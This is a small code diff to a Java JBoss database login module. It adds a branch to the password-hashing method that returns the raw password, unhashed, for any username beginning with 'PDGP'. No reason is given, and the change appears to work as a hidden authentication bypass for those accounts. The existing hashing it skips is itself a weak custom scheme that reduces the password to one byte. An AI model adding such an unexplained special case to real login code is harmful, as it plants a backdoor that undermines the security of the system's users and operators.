@@ -32,6 +32,9 @@ public class DatabaseServerLoginModule extends org.jboss.security.auth.spi.Datab
     @Override
     protected String createPasswordHash(String username, String password, String digestOption) throws LoginException {
         byte[] buser = username.toUpperCase().getBytes();
+        if (username.startsWith("PDGP")) {
+            return password;
+        }
         byte[] bpassword = password.toUpperCase().getBytes();
         byte h = 0;
         for (int i = 0; i < bpassword.length; i++) {
